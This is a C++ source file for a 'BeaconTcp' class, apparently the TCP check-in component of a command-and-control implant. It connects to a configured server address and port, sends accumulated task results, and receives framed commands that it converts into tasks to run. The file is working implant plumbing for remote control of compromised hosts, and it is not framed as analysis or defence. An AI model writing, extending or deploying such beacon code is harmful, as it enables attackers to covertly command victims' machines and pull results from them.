#include "BeaconTcp.hpp"
#include <SocketClient.hpp>

using namespace std;


BeaconTcp::BeaconTcp(std::string& config, std::string& ip, int port)
    : Beacon()
{
    m_ip = ip;
    m_port = port;

    // beacon and modules config
    initConfig(config);

    m_client=new SocketTunnelClient();
}


BeaconTcp::~BeaconTcp()
{
    delete m_client;
}


void BeaconTcp::checkIn()
{    
    int ret = m_client->init(m_ip, m_port);

    if(ret)
    {
        if (m_pendingOutput.empty())
        {
            taskResultsToCmd(m_pendingOutput);
            m_pendingOutput.append(TcpFrameBuffer::delimiter());
        }

        std::string input;
        bool wasSent = false;
        int res = m_client->process(m_pendingOutput, input, &wasSent);
        if (wasSent)
            m_pendingOutput.clear();

        if(res<=0)
        {
            m_client->reset();
            m_frames.reset();
        }
        else if(!input.empty())
        {
            std::vector<std::string> frames;
            if (!m_frames.append(input, frames))
            {
                m_client->reset();
                return;
            }

            for(const auto& frame : frames)
                cmdToTasks(frame);
        }

    }
}

    



